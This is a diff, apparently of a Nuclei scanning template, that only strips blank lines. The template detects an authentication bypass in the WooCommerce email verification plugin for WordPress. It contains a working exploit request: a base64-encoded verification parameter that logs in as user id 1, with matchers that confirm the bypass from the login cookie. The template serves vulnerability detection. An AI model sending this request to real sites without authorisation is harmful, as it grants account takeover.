@@ -1,5 +1,4 @@
 id: wp-woocommerce-email-verification
-
 info:
   name: WordPress WooCommerce <1.8.2 - Authentication Bypass
   author: random_robbie,daffianfo
@@ -12,13 +11,11 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-288
   tags: wordpress,wp-plugin,woocommerce
-
 requests:
   - method: GET
     path:
       - "{{BaseURL}}/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0="
       - "{{BaseURL}}/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0="
-
     stop-at-first-match: true
     matchers-condition: and
     matchers:
@@ -26,14 +23,12 @@ requests:
         part: header
         regex:
           - "wordpress_logged_in_[a-z0-9]{32}"
-
       - type: word
         part: body
         words:
           - "Your account has been activated!"
           - "From your account dashboard you can view your"
         condition: and
-
       - type: status
         status:
           - 200
